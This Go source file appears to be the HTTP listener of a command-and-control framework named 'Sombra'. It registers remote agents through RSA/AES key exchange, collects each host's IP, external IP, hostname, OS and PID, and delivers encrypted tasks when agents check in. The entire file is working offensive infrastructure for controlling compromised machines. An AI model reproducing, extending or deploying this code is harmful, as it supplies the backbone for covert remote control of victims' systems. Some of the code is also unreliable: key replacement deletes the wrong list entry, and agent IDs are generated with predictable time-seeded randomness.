package listeners

import (
	"crypto/rsa"
	"fmt"
	"math/rand"
	"net/http"
	"strings"
	"sync"
	"time"

	"sombra/cmd/crypto"
	"sombra/cmd/transport"
	"sombra/pkg/logger"

	"github.com/gin-gonic/gin"
)

var (
	Version  = "0.0.1-dev"
	Listener = "HTTP"
)

type AgentKeys struct {
	UID   string
	Key   []byte
	Nonce []byte
}

type Callback struct {
	AgentUID     string
	LastCallback int
}

type State struct {
	/*
		danger: the state is passed by reference to listeners, this is mutable
	*/
	Data Shared
	mu   sync.Mutex
}

type Gateway struct {
	Agent transport.Agent
	Task  transport.Task
}

type Shared struct {
	AgentKeys      []AgentKeys
	AgentList      []transport.Agent
	AgentTasks     []transport.Task
	AgentResults   []transport.Result
	AgentCallbacks []Callback
	Gateways       []Gateway
}

func GenerateRandomString(length int) string {
	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	seededRand := rand.New(rand.NewSource(time.Now().UnixNano()))
	result := make([]byte, length)
	for i := range result {
		result[i] = charset[seededRand.Intn(len(charset))]
	}
	return string(result)
}

func NewState() *State {
	return &State{
		Data: Shared{},
	}
}

func (s *State) VerifyAgent(uid string) bool {
	s.mu.Lock()
	defer s.mu.Unlock()

	for _, agent := range s.Data.AgentList {
		if agent.UID == uid {
			return true
		}
	}

	return false
}

func (s *State) DeleteAgent(uid string) {
	/*
		Assumes that the state is already locked, remember to lock before calling!
	*/
	for i, agent := range s.Data.AgentList {
		if agent.UID == uid {
			s.Data.AgentList = append(s.Data.AgentList[:i], s.Data.AgentList[i+1:]...)
			break
		}
	}
}

func (s *State) AddAgent(agent transport.Agent) error {
	s.mu.Lock()
	defer s.mu.Unlock()

	for _, a := range s.Data.AgentList {
		if a.UID == agent.UID {
			return fmt.Errorf("agent already exists")
		}
	}

	s.Data.AgentList = append(s.Data.AgentList, agent)
	return nil
}

func (s *State) CheckTasks(uid string) (transport.Agent, transport.Task) {
	/*
		we're assuming that this function is only ever called if the UID is valid.
	*/

	s.mu.Lock()
	defer s.mu.Unlock()

	var (
		agent transport.Agent
		task  transport.Task
	)

	for _, gateway := range s.Data.Gateways {
		if gateway.Agent.UID == uid {
			/*
				We're only interested in the FIRST task, subsequent tasks will not be fulfilled in parallel.
			*/
			agent = gateway.Agent
			task = gateway.Task
			break

		}
	}

	return agent, task
}

func (s *State) AddAgentKey(uid string, key []byte, nonce []byte) {
	s.mu.Lock()
	defer s.mu.Unlock()

	for _, agent := range s.Data.AgentKeys {
		if agent.UID == uid {
			/* if the agent already has a key, remove it */
			s.Data.AgentKeys = append(s.Data.AgentKeys[:0], s.Data.AgentKeys[1:]...)

			/* Since there's a new key, we also need to kill the old agent */
			s.DeleteAgent(uid)
			break
		}
	}

	s.Data.AgentKeys = append(s.Data.AgentKeys, AgentKeys{UID: uid, Key: key, Nonce: nonce})
}

func (s *State) FindAgentKey(uid string) (nonce []byte, key []byte) {
	s.mu.Lock()
	defer s.mu.Unlock()

	for _, agent := range s.Data.AgentKeys {
		if agent.UID == uid {
			return agent.Nonce, agent.Key
		}
	}

	return nil, nil
}

func Start(port string, sharedState *State, publicKey *rsa.PublicKey, privateKey *rsa.PrivateKey) error {

	r := gin.Default()

	r.POST("/register", func(c *gin.Context) {
		rawData, err := c.GetRawData()
		if err != nil {
			c.String(http.StatusBadRequest, "invalid request")
			return
		}

		msg, err := transport.DecodeLTVMessage(rawData)
		if err != nil {
			c.String(http.StatusBadRequest, "invalid request")
			return
		}

		switch msg.Type {
		case transport.TypeSombraHello:
			rawData, err := c.GetRawData()
			if err != nil {
				c.String(http.StatusBadRequest, "invalid request")
				return
			}

			_, err = transport.DecodeLTVMessage(rawData)
			if err != nil {
				c.String(http.StatusBadRequest, "invalid request")
				return
			}
			// ;)
			res := fmt.Sprintf("Sombra v%s - %s", Version, Listener)
			ltv, err := transport.EncodeLTVMessage(transport.TypeSombraHello, []byte(res))
			if err != nil {
				c.String(http.StatusInternalServerError, "failed to encode response")
				return
			}
			c.String(http.StatusOK, string(ltv))

		case transport.TypeSombraKeyExchange:

			logger.Info("got initial check-in, beginning key exchange with agent")
			logger.Debug("sending public key to agent")

			msg, err := transport.EncodeLTVMessage(transport.TypeSombraKeyExchange, publicKey.N.Bytes())
			if err != nil {
				c.String(http.StatusInternalServerError, "failed to encode response")
				return
			}
			c.String(http.StatusOK, string(msg))
		case transport.TypeSombraGenSession:
			logger.Info("unwrapping AES key from agent")
			nonce, key, err := transport.UnwrapKey(string(msg.Value), privateKey)
			if err != nil {
				c.String(http.StatusInternalServerError, "failed to unwrap key")
				return
			}

			logger.Info("AES key exchange successful with agent, creating registration UID for them")

			uid := GenerateRandomString(32)
			sharedState.AddAgentKey(uid, key, nonce)

			ltv, err := transport.EncodeLTVMessage(transport.TypeSombraGenSession, []byte(uid))
			if err != nil {
				c.String(http.StatusInternalServerError, "failed to encode response")
				return
			}
			c.String(http.StatusOK, string(ltv))
		case transport.TypeSombraInitAgent:
			logger.Info("received final registration from agent")
			//  UID || {encrypted_blob}
			uid := strings.Split(string(msg.Value), "||")[0]
			agentData := strings.Split(string(msg.Value), "||")[1]
			fmt.Println("uid: ", uid)
			fmt.Println("agentData: ", agentData)

			logger.Info(fmt.Sprintf("registering agent: %s", uid))
			agent, err := ParseAgent(uid, agentData, sharedState)
			if err != nil {
				c.String(http.StatusBadRequest, "invalid agent data")
				return
			}

			if err := sharedState.AddAgent(agent); err != nil {
				c.String(http.StatusBadRequest, "failed to register agent")
				return
			}
			c.String(http.StatusOK, "agent registered")
		}
	})

	r.POST("/checkin", func(c *gin.Context) {

		rawData, err := c.GetRawData()
		if err != nil {
			c.JSON(http.StatusBadRequest, gin.H{"error": "invalid request"})
			return
		}

		msg, err := transport.DecodeLTVMessage(rawData)
		if err != nil {
			c.JSON(http.StatusBadRequest, gin.H{"error": "invalid request"})
			return
		}

		if msg.Type != transport.TypeGenericCheckin {
			c.JSON(http.StatusBadRequest, gin.H{"error": "invalid request"})
			return
		}

		uid := string(msg.Value)
		if !sharedState.VerifyAgent(uid) {
			c.JSON(http.StatusBadRequest, gin.H{"error": "invalid agent"})
			return
		}

		logger.Info(fmt.Sprintf("agent check-in: %s", uid))

		agent, task := sharedState.CheckTasks(uid)
		if agent.UID == "" || task.UID == "" {
			ltv, err := transport.EncodeLTVMessage(transport.TypeGenericSombraPackage, []byte("no tasks"))
			if err != nil {
				c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to encode response"})
				return
			}
			c.String(http.StatusOK, string(ltv))
			return
		}

		nonce, key := sharedState.FindAgentKey(uid)
		if nonce == nil || key == nil {
			c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to find agent key"})
			return
		}

		envelope := transport.Envelope{
			Agent: agent,
			Task:  task,
		}

		pkg, err := envelope.Package(key, nonce)
		if err != nil {
			c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to package task"})
			return
		}

		ltv, err := transport.EncodeLTVMessage(transport.TypeGenericSombraPackage, pkg.Pkg)
		if err != nil {
			c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to encode response"})
			return
		}

		c.String(http.StatusOK, string(ltv))
	})

	go func() {
		logger.Info(fmt.Sprintf("starting HTTP listener on port %s", port))

		if err := r.Run(":" + port); err != nil {
			panic(err)
		}
	}()

	return nil
}

func ParseAgent(uid string, encAgentData string, state *State) (transport.Agent, error) {
	nonce, sk := state.FindAgentKey(uid)
	if nonce == nil || sk == nil {
		return transport.Agent{}, fmt.Errorf("failed to find agent key")
	}

	encryptedData, err := crypto.Base64Decode(encAgentData)
	if err != nil {
		return transport.Agent{}, err
	}

	decryptedData, err := crypto.DecryptAES(sk, nonce, encryptedData)
	if err != nil {
		return transport.Agent{}, err
	}

	// each element is separated by ||, so we can split on that
	agentData := strings.Split(string(decryptedData), "||")
	fmt.Println(agentData)
	if len(agentData) != 8 {
		return transport.Agent{}, fmt.Errorf("invalid agent data")
	}

	agent := transport.Agent{
		IP:       agentData[0],
		ExtIP:    agentData[1],
		Hostname: agentData[2],
		Sleep:    agentData[3],
		Jitter:   agentData[4],
		OS:       agentData[5],
		UID:      agentData[6],
		PID:      agentData[7],
	}

	return agent, nil
}
